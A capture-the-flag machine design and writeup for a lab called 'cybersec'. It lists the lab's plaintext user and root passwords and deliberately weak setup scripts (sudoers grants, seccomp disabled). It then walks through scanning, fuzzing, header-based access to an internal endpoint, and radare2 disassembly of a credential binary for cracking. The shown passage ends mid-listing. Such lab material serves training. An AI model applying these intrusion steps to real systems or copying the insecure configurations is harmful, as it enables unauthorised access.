# cybersec

## Introduction

I created this machine with the intention of highlighting the Bof vulnerability, even when all protections are active, but it is combined with bad configurations as well as the power of reverse engineering and cracking. In addition, I also want to highlight the importance of having critical endpoints that could expose sensitive information well secured.

## Info for HTB

### Access

Passwords:

| User   | Password                            |
| -----  | ----------------------------------- |
| carlos |  deephack009|
| pedro  |  12369874qwertyuiop|
| root   |  pQcp0mvmered11100011pass|

### Key Processes

The web service is set up with Flask, the path to the `.py` file is:

```/root/cybersec/app.py```

The other service present on the machine is `SSH`, which runs with 

```sudo service ssh start```

For the `hallx` and `sec2pass` binaries I send the source codes separately.

### Automation / Crons

`/usr/local/bin/secure_gdb :` 
The gdb wrapper is responsible for wrapping gdb to secure its execution with sudo and thus, along with the /root/.gdbinit configuration file, prevent direct escalation to root without having to exploit the bof.

```bash
#!/bin/bash
# script que le otorga permisos al usuario pedro para que ejecute unica y exclusivamente el binario en su directorio
bin_path="/home/pedro/hallx"
hash="183480399567de77e64a64c571bcfe7ccc0c5f67830300ac8f9b6fa6990bfc26"

if [[ $# -ne 1 ]]; then
    echo "Error: Only one argument is allowed (the path to the binary >> $bin_path)."
    exit 1
fi

if [[ "$1" != $bin_path ]]; then
    echo "Permission denied: You can only debug the binary $bin_path"
    exit 1
fi

validator=$(sha256sum "$1" |awk '{print $1}')

if [[ "$hash" != "$validator" ]]; then
   echo "Modified binary, aborting execution"
   echo "Notifying System Administrator of Event!"
   echo "Binary modification detected $bin_path" >> /root/Events.log
   sleep 2
   echo "Notification Sent"
   exit 1
fi

/usr/bin/gdb -nx -x /root/.gdbinit "$@"
```



`/root/.gdbinit:` 
gdb configuration file to block the execution of system commands

```
set confirm off

define shell
  echo "The use of the 'shell' command is disabled."\n
end
```



`/root/conf.sh:` 
This script is responsible for simulating the interaction with the system administrator via email to assign privileges to users. It is also responsible for removing privileges from users every 3 minutes. On the other hand, the script starts the SSH and HTTP services. Finally, it runs an additional script in the background [restart.sh].

```bash
#!/bin/bash
# script to start the machine with its services and to set and reset the permissions assigned to users

# start services and cleanup script
service ssh start
setsid python3 /root/cybersec/app.py &
setsid /root/restart.sh &

n="1"
m="1"
while true; do
    # to enable the user Pedro to use gdb to debug the binary with privileges
    if grep -q "1250314" /var/mail/mail && [[ "$n" -eq 1 ]]; then
           echo "pedro ALL=(root) NOPASSWD: /usr/local/bin/secure_gdb" >> /etc/sudoers
           sleep 5
           echo "Pedro, he habilitado un script con el que podrás depurar el binario como root (hemos configurado un entorno lo más seguro posible debido a las implicaciones que esto podría tener). Puedes revisar tus permisos de sudo. Ten en cuenta que estos permisos se revocan ocasionalmente, por lo que tendrás que solicitarlos de nuevo." |mail -s "gdb" pedro
           n="2"
    fi

    # To enable user Carlos to use Exim while Pedro returns.
    if grep -q "1250319" /var/mail/mail && grep -q "000-01458" /var/mail/mail && [[ "$m" -eq 1 ]]; then
           echo "carlos ALL=(pedro) NOPASSWD: /usr/sbin/exim " >> /etc/sudoers
           sleep 5
           echo "Hola Carlos, ya puedes revisar el buzón de Pedro y responder sus correos. Estos permisos se revocarán periódicamente y tendrás que volver a solicitarlos." |mail -s "gdb" carlos
           m="2"
    fi

    # to reset permissions every 3 min.
    if [[ "$n" -eq 2 || "$m" -eq 2 ]]; then
          echo " " > /var/mail/mail
          sleep 180
          cat /root/sudoers > /etc/sudoers
          n="1"
          m="1"
    fi
    sleep 20
done
```



`/root/restart.sh:`
This script is responsible for cleaning the root, Pedro, Carlos and TMP directories in case any player leaves files behind. The cleanup is performed every 3 minutes. 

```bash
#!/bin/bash
# cleanup script, user directories and tmp are cleaned
while true; do

  find /home/pedro -mindepth 1 -maxdepth 1 ! -name 'hallx' ! -name 'mbox' ! -name '.*' ! -name 'analisis_hallx' -exec rm -rf {} +
  find /home/carlos -mindepth 1 -maxdepth 1 ! -name 'mbox' ! -name 'user.txt' ! -name '.*' -exec rm -rf {} +
  find /tmp -mindepth 1 -maxdepth 1 -exec rm -rf {} +
  find /root -mindepth 1 -maxdepth 1 ! -name 'conf.sh' ! -name 'cybersec' ! -name 'restart.sh' ! -name 'root.txt' ! -name 'sudoers' ! -name '.*' -exec rm -rf {} +

  # Wait 3 minutes before the next cleaning
  sleep 180
done
```


### Firewall Rules

sin rules

### Docker

Dockerfile

```
FROM cybersec:latest

CMD /root/conf.sh & && \
    tail -f /dev/null
```

I have also created a script to automate the execution and subsequent cleaning of the image in the system.

run_cybersec.sh
```bash
#!/bin/bash
# autor: darksblack
# Color
CBL='\033[34m'  # blue
CBLE='\033[36m' # Cyan
BLD='\033[1m'   # Bold type
CNC='\033[0m'   # Reset color
# banner
printf "\t ${CBL}${BLD} \n"
printf "\t       ____      _               ____\n"
printf "\t      / ___|   _| |__   ___ _ __/ ___|  ___  ___\n"
printf "\t     | |  | | | |  _ \ / _ \  __\___ \ / _ \/ __|\n"
printf "\t     | |__| |_| | |_) |  __/ |   ___) |  __/ (__\n"
printf "\t      \____\__, |_.__/ \___|_|  |____/ \___|\___|\n"
printf "\t           |___/\n"
printf "\t ${CNC} \n"

name="cybersec"

stop_del() {

    docker rm -f $name > /dev/null 2>&1 # we remove the docker container
    docker rmi -f $name > /dev/null 2>&1 # We remove the docker image
}


trap ctrl_c SIGINT

function ctrl_c() {
    echo -e "\e[1mDeleting the lab, wait a moment...\e[0m"
    stop_del
    echo -e "\nThe lab has been completely removed from the system."
    exit 0
}

# load the Docker image
docker load -i cybersec.tar > /dev/null

# we run the container
docker run --name $name -d --security-opt seccomp=unconfined --hostname $name -it $name >/dev/null

# --security-opt seccomp=unconfined: It is implemented to be able to make system calls, such as execve, which is necessary to exploit bof.
# Docker containers block this by default

# we extract the IP address of the container.
IP_ADDRESS=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $name)

printf "${CBLE}${BLD}\n"
echo "Machine deployed, its IP address is -->" $IP_ADDRESS
printf "\t ${CNC} \n"

# Wait indefinitely so that the script does not terminate.
while true; do
    sleep 1
done
```
If you are not using the previous script, it is important to run the container with the `--security-opt seccomp=unconfined` parameters, as this is essential for performing the Bof exploitation in the `hall` binary. This is because Docker containers block system calls by default, and the Bof exploitation uses the `execve` system call to invoke a `shell` and thus obtain `root`.




### Other

[Include any other design decisions you made that the HTB staff should know about]



# Writeup

The machine acquisition process begins by analyzing the website where we obtained endpoints. After locating the appropriate endpoint, we need to find a way to access the information it contains, where we will obtain sensitive information such as URLs and UUIDs. Among the subdomains, we find a binary and a note. This binary is still in development, but apparently contains valid credentials, as its purpose appears to be to manage employee credentials. It is through this binary that we gain access to the machine, as it must be hacked to reveal access credentials. Once inside the system, we can read emails between users and the administrator. Through impersonation, we can request privileges from the administrator and thus escalate until we take full control of the system.

# Enumeration

## Enumeration of Ports, Services and Versions

```bash
sudo nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-23 09:18 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 88:00:5f:26:eb:50:e4:55:6d:0a:0c:73:58:99:cd:2d (ECDSA)
|_  256 6b:36:5c:a3:c0:8b:22:b7:35:11:86:f1:7e:7f:77:5b (ED25519)
80/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Did not follow redirect to http://cybersec.htb
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
```

We see that the `SSH` and `HTTP` services are running, so we'll start by checking the web service, but first we must add the domain reported by `nmap` to the `/etc/hosts` file.

```bash
echo "172.17.0.2 cybersec.htb" >> /etc/hosts
```
Now we can consult the web service

![image](https://github.com/user-attachments/assets/d3951830-49b0-47e2-a78e-27984d1931b5)

It seems to be about a cybersecurity company. If we test the contact panel, it has nothing to offer. If we check the source code, we can see some interesting information.

![image](https://github.com/user-attachments/assets/cb06b947-6249-49ce-907f-5b80ee138581)

uses an `api` to generate the secure credentials message, we check 

![image](https://github.com/user-attachments/assets/3e881c99-33e0-4133-804d-72f41ac8ddd7)

I'll see if I can get more endpoints by fuzzing.

```bash
feroxbuster -u http://cybersec.htb/api -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 200 --random-agent --no-state -d 5
```
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cybersec.htb/api
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://cybersec.htb/api/interest
[>-------------------] - 20s     9761/207629  7m      found:1       errors:0      
[>-------------------] - 20s     9753/207629  476/s   http://cybersec.htb/api/
```

I get one more end point, so we can test it.

![image](https://github.com/user-attachments/assets/ac679b8c-7294-4cf0-b146-13abe557c1fe)

We see that it tells us "Method not allowed" so it must be `POST` so I try with `curl`

```bash
curl -X POST http://cybersec.htb/api/interest
```
```bash
{
  "message": "Error: 'Role' header not provided"
}
```

We see the error message that the Role header is missing, so after trying different roles I found 2 correct roles: user and administrator

![image](https://github.com/user-attachments/assets/d3c8744d-8dac-4ae2-8149-0c8f106251a7)

One returns basic information and the other more sensitive information and after testing the different subdomains, I get 2 assets.

![image](https://github.com/user-attachments/assets/51d46425-d731-497b-b28a-b25d0ec2271d)

![image](https://github.com/user-attachments/assets/91f60284-40b7-49fd-801a-e46795e86de1)


active URLs: `http://mail.cybersec.htb/` & `http://0internal_down.cybersec.htb/`

After testing the email subdomain, I didn't find any vulnerabilities, so we checked the other active subdomain where we see it indicates a missing header. If we look at the details we see that the header seems to refer to the UUIDs we got in /api/interest. I'm going to test the header with the UUIDs in /api/interest

```bash
curl http://0internal_down.cybersec.htb -H "X-UUID-Access: f47ac10b-58cc-4372-a567-0e02b2c3d479"
```
```html
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cybersec - Sec2Pass</title>
    <link rel="icon" href="http://cybersec.htb/static/favicon.ico" type="image/x-icon">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #202343;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }

        h1 {
            text-align: center;
            color: #333;
        }

        .file-list {
            margin-top: 20px;
        }

        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #eaeaea;
        }

        .file-item:last-child {
            border-bottom: none;
        }

        .file-name {
            font-weight: bold;
            color: #555;
        }

        .download-btn {
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 8px 12px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .download-btn:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Sec2Pass</h1>
        <div class="file-list">
            <div class="file-item">
                <span class="file-name">sec2pass</span>
                <button class="download-btn" onclick="downloadFile('sec2pass')">Descargar</button>
            </div>

            <div class="file-item">
                <span class="file-name">sec2pass_note.txt</span>
                <button class="download-btn" onclick="downloadFile('sec2pass_note.txt')">Descargar</button>
            </div>




        </div>
    </div>

    <script>
        function downloadFile(fileName) {
                 const link = document.createElement('a');
                 link.href = `http://0internal_down.cybersec.htb/download/${fileName}`;
                 link.download = fileName; 
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
        }
    </script>
    </script>
</body>
</html>
```
Analyzing the code, I see 2 files which I am going to download in the following way

```bash
wget http://0internal_down.cybersec.htb/download/sec2pass_note.txt
```
```bash
wget http://0internal_down.cybersec.htb/download/sec2pass
```

we read the downloaded note

```bash
cat sec2pass_note.txt
```
```bash
At Cybersec we are committed to information security, for this reason we have developed a program so that our associates 
do not have to remember credentials, it is currently in beta phase, so not all credentials are stored yet, but in the 
short term improvements will be included and credentials of more associates will be added... Our program, Sec2Pass, 
has 3 levels of security to protect internal credentials, and to avoid information leakage, the authentication credentials 
to access internal credentials are automatically updated every 24 hours, for this reason it will be mandatory to request the 
primary credentials when arriving at the company where they will be given the first access password as well as an additional 
security ping and in this way, Sec2Pass will provide them with the remote access credentials necessary to perform their functions.
```
The sec2pass program appears to store credentials, but two levels of verification are required to reveal the remote access credentials. Since I don't have the password, I'm going to apply reverse engineering to see if it's possible to extract the information or if it's necessary to crack the binary.

![image](https://github.com/user-attachments/assets/08418788-2008-4149-b9c5-5f915522e7c3)



# Foothold

## Reverse Engineering & cracking

### GHIDRA

I start by opening the program with Ghidra to try to extract information.

```bash
ghidra 
```

![image](https://github.com/user-attachments/assets/680651eb-199c-4bdf-9d0a-197db57adedd)

We load the program and begin its analysis

![image](https://github.com/user-attachments/assets/61321535-3ea9-43e8-8c45-4698c1e24293)

![image](https://github.com/user-attachments/assets/56497bc7-c4d5-41a0-81cb-1cc3f4c739cc)


After an analysis, it is observed that the sensitive information is encrypted with sha256-ecb, trying to decrypt the information is a very complex process and even more so taking into account that the information, as observed, is fragmented, so the strategy that I will use will be to crack the program to bypass the verification system.


### Cracking

To crack the binary we will use `radare2`

```bash
r2 -w sec2pass
```
```bash
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x00002150]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x00002150]> s main
[0x00002ccf]> pdf
Do you want to print 366 lines? (y/N) y
            ; ICOD XREF from entry0 @ 0x2164(r)
┌ 1737: int main (int argc, char **argv, char **envp);
│ afv: vars(7:sp[0x10..0x10f8])
│           0x00002ccf      55             push rbp
│           0x00002cd0      4889e5         mov rbp, rsp
│           0x00002cd3      4881ecf010..   sub rsp, 0x10f0
│           0x00002cda      64488b0425..   mov rax, qword fs:[0x28]
│           0x00002ce3      488945f8       mov qword [canary], rax
│           0x00002ce7      31c0           xor eax, eax
│           0x00002ce9      488d95f0ef..   lea rdx, [format]
│           0x00002cf0      b800000000     mov eax, 0
│           0x00002cf5      b980000000     mov ecx, 0x80
│           0x00002cfa      4889d7         mov rdi, rdx
│           0x00002cfd      f348ab         rep stosq qword [rdi], rax
│           0x00002d00      488b150135..   mov rdx, qword [obj.AMLP]   ; [0x6208:8]=0x41dd "ing"
│           0x00002d07      488d85f0ef..   lea rax, [format]
│           0x00002d0e      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d11      4889c7         mov rdi, rax                ; char *s1
│           0x00002d14      e807f4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d19      488b15f034..   mov rdx, qword [obj.PRZS]   ; [0x6210:8]=0x41e1 "res"
│           0x00002d20      488d85f0ef..   lea rax, [format]
│           0x00002d27      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d2a      4889c7         mov rdi, rax                ; char *s1
│           0x00002d2d      e8eef3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d32      488b15df34..   mov rdx, qword [obj.ING]    ; [0x6218:8]=0x4027 ; "'@"
│           0x00002d39      488d85f0ef..   lea rax, [format]
│           0x00002d40      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d43      4889c7         mov rdi, rax                ; char *s1
│           0x00002d46      e8d5f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d4b      488d85f0ef..   lea rax, [format]
│           0x00002d52      4889c7         mov rdi, rax                ; const char *s
│           0x00002d55      e806f3ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002d5a      4889c2         mov rdx, rax
│           0x00002d5d      488d85f0ef..   lea rax, [format]
│           0x00002d64      4801d0         add rax, rdx
│           0x00002d67      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002d6c      488b15ad34..   mov rdx, qword [obj.PROS]   ; [0x6220:8]=0x41e5 "la"
│           0x00002d73      488d85f0ef..   lea rax, [format]
│           0x00002d7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002d80      e89bf3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d85      488d85f0ef..   lea rax, [format]
│           0x00002d8c      4889c7         mov rdi, rax                ; const char *s
│           0x00002d8f      e8ccf2ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002d94      4889c2         mov rdx, rax
│           0x00002d97      488d85f0ef..   lea rax, [format]
│           0x00002d9e      4801d0         add rax, rdx
│           0x00002da1      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002da6      488b157b34..   mov rdx, qword [obj.TANO]   ; [0x6228:8]=0x41e8 "co"
│           0x00002dad      488d85f0ef..   lea rax, [format]
│           0x00002db4      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002db7      4889c7         mov rdi, rax                ; char *s1
│           0x00002dba      e861f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002dbf      488b156a34..   mov rdx, qword [obj.CHZ]    ; [0x6230:8]=0x4029 ; ")@"
│           0x00002dc6      488d85f0ef..   lea rax, [format]
│           0x00002dcd      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002dd0      4889c7         mov rdi, rax                ; char *s1
│           0x00002dd3      e848f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002dd8      488b155934..   mov rdx, qword [obj.PWD]    ; [0x6238:8]=0x41eb "tra"
│           0x00002ddf      488d85f0ef..   lea rax, [format]
│           0x00002de6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002de9      4889c7         mov rdi, rax                ; char *s1
│           0x00002dec      e82ff3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002df1      488b154834..   mov rdx, qword [obj.CLIK]   ; [0x6240:8]=0x41ef "se.."
│           0x00002df8      488d85f0ef..   lea rax, [format]
│           0x00002dff      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e02      4889c7         mov rdi, rax                ; char *s1
│           0x00002e05      e816f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e0a      488b153734..   mov rdx, qword [obj.PARR]   ; [0x6248:8]=0x41f4
│           0x00002e11      488d85f0ef..   lea rax, [format]
│           0x00002e18      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e1b      4889c7         mov rdi, rax                ; char *s1
│           0x00002e1e      e8fdf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e23      488d95f0f3..   lea rdx, [s]
│           0x00002e2a      b800000000     mov eax, 0
│           0x00002e2f      b980000000     mov ecx, 0x80
│           0x00002e34      4889d7         mov rdi, rdx
│           0x00002e37      f348ab         rep stosq qword [rdi], rax
│           0x00002e3a      488b15e733..   mov rdx, qword [obj.TANO]   ; [0x6228:8]=0x41e8 "co"
│           0x00002e41      488d85f0f3..   lea rax, [s]
│           0x00002e48      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e4b      4889c7         mov rdi, rax                ; char *s1
│           0x00002e4e      e8cdf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e53      488b15d633..   mov rdx, qword [obj.CHZ]    ; [0x6230:8]=0x4029 ; ")@"
│           0x00002e5a      488d85f0f3..   lea rax, [s]
│           0x00002e61      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e64      4889c7         mov rdi, rax                ; char *s1
│           0x00002e67      e8b4f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e6c      488b15c533..   mov rdx, qword [obj.PWD]    ; [0x6238:8]=0x41eb "tra"
│           0x00002e73      488d85f0f3..   lea rax, [s]
│           0x00002e7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002e80      e89bf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e85      488b15b433..   mov rdx, qword [obj.CLIK]   ; [0x6240:8]=0x41ef "se.."
│           0x00002e8c      488d85f0f3..   lea rax, [s]
│           0x00002e93      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e96      4889c7         mov rdi, rax                ; char *s1
│           0x00002e99      e882f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e9e      488b151334..   mov rdx, qword [obj.ASMLF]  ; [0x62b8:8]=0x4224 ; "$B"
│           0x00002ea5      488d85f0f3..   lea rax, [s]
│           0x00002eac      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002eaf      4889c7         mov rdi, rax                ; char *s1
│           0x00002eb2      e869f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002eb7      488d85f0f3..   lea rax, [s]
│           0x00002ebe      4889c7         mov rdi, rax                ; const char *s
│           0x00002ec1      e89af1ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002ec6      4889c2         mov rdx, rax
│           0x00002ec9      488d85f0f3..   lea rax, [s]
│           0x00002ed0      4801d0         add rax, rdx
│           0x00002ed3      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002ed8      488b157133..   mov rdx, qword [obj.VNZ]    ; [0x6250:8]=0x41f8
│           0x00002edf      488d85f0f3..   lea rax, [s]
│           0x00002ee6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002ee9      4889c7         mov rdi, rax                ; char *s1
│           0x00002eec      e82ff2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002ef1      488b156033..   mov rdx, qword [obj.HK]     ; [0x6258:8]=0x41fa str.ncor
│           0x00002ef8      488d85f0f3..   lea rax, [s]
│           0x00002eff      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f02      4889c7         mov rdi, rax                ; char *s1
│           0x00002f05      e816f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f0a      488b154f33..   mov rdx, qword [obj.EEUU]   ; [0x6260:8]=0x41ff "re"
│           0x00002f11      488d85f0f3..   lea rax, [s]
│           0x00002f18      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f1b      4889c7         mov rdi, rax                ; char *s1
│           0x00002f1e      e8fdf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f23      488b153e33..   mov rdx, qword [obj.DNMC]   ; [0x6268:8]=0x4202 "cta"
│           0x00002f2a      488d85f0f3..   lea rax, [s]
│           0x00002f31      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f34      4889c7         mov rdi, rax                ; char *s1
│           0x00002f37      e8e4f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f3c      488b156533..   mov rdx, qword [obj.ERTG]   ; [0x62a8:8]=0x4220 ; " B"
│           0x00002f43      488d85f0f3..   lea rax, [s]
│           0x00002f4a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f4d      4889c7         mov rdi, rax                ; char *s1
│           0x00002f50      e8cbf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f55      488d95f0f7..   lea rdx, [var_810h]
│           0x00002f5c      b800000000     mov eax, 0
│           0x00002f61      b980000000     mov ecx, 0x80
│           0x00002f66      4889d7         mov rdi, rdx
│           0x00002f69      f348ab         rep stosq qword [rdi], rax
│           0x00002f6c      488b159532..   mov rdx, qword [obj.AMLP]   ; [0x6208:8]=0x41dd "ing"
│           0x00002f73      488d85f0f7..   lea rax, [var_810h]
│           0x00002f7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002f80      e89bf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f85      488b158432..   mov rdx, qword [obj.PRZS]   ; [0x6210:8]=0x41e1 "res"
│           0x00002f8c      488d85f0f7..   lea rax, [var_810h]
│           0x00002f93      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f96      4889c7         mov rdi, rax                ; char *s1
│           0x00002f99      e882f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f9e      488b157332..   mov rdx, qword [obj.ING]    ; [0x6218:8]=0x4027 ; "'@"
│           0x00002fa5      488d85f0f7..   lea rax, [var_810h]
│           0x00002fac      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002faf      4889c7         mov rdi, rax                ; char *s1
│           0x00002fb2      e869f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002fb7      488d85f0f7..   lea rax, [var_810h]
│           0x00002fbe      4889c7         mov rdi, rax                ; const char *s
│           0x00002fc1      e89af0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002fc6      4889c2         mov rdx, rax
│           0x00002fc9      488d85f0f7..   lea rax, [var_810h]
│           0x00002fd0      4801d0         add rax, rdx
│           0x00002fd3      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002fd8      488b15e132..   mov rdx, qword [obj.ASMQ]   ; [0x62c0:8]=0x4226 "el" ; "&B"
│           0x00002fdf      488d85f0f7..   lea rax, [var_810h]
│           0x00002fe6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002fe9      4889c7         mov rdi, rax                ; char *s1
│           0x00002fec      e82ff1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002ff1      488d85f0f7..   lea rax, [var_810h]
│           0x00002ff8      4889c7         mov rdi, rax                ; const char *s
│           0x00002ffb      e860f0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003000      4889c2         mov rdx, rax
│           0x00003003      488d85f0f7..   lea rax, [var_810h]
│           0x0000300a      4801d0         add rax, rdx
│           0x0000300d      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003012      488b155732..   mov rdx, qword [obj.NRG]    ; [0x6270:8]=0x4206 "cod"
│           0x00003019      488d85f0f7..   lea rax, [var_810h]
│           0x00003020      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003023      4889c7         mov rdi, rax                ; char *s1
│           0x00003026      e8f5f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000302b      488b154632..   mov rdx, qword [obj.BRZL]   ; [0x6278:8]=0x420a "igo" ; "\nB"
│           0x00003032      488d85f0f7..   lea rax, [var_810h]
│           0x00003039      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000303c      4889c7         mov rdi, rax                ; char *s1
│           0x0000303f      e8dcf0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003044      488d85f0f7..   lea rax, [var_810h]
│           0x0000304b      4889c7         mov rdi, rax                ; const char *s
│           0x0000304e      e80df0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003053      4889c2         mov rdx, rax
│           0x00003056      488d85f0f7..   lea rax, [var_810h]
│           0x0000305d      4801d0         add rax, rdx
│           0x00003060      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003065      488b151432..   mov rdx, qword [obj.LAKDF]  ; [0x6280:8]=0x420e "de"
│           0x0000306c      488d85f0f7..   lea rax, [var_810h]
│           0x00003073      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003076      4889c7         mov rdi, rax                ; char *s1
│           0x00003079      e8a2f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000307e      488d85f0f7..   lea rax, [var_810h]
│           0x00003085      4889c7         mov rdi, rax                ; const char *s
│           0x00003088      e8d3efffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0000308d      4889c2         mov rdx, rax
│           0x00003090      488d85f0f7..   lea rax, [var_810h]
│           0x00003097      4801d0         add rax, rdx
│           0x0000309a      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x0000309f      488b15e231..   mov rdx, qword [obj.WVWVEB] ; [0x6288:8]=0x4211 "seg"
│           0x000030a6      488d85f0f7..   lea rax, [var_810h]
│           0x000030ad      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030b0      4889c7         mov rdi, rax                ; char *s1
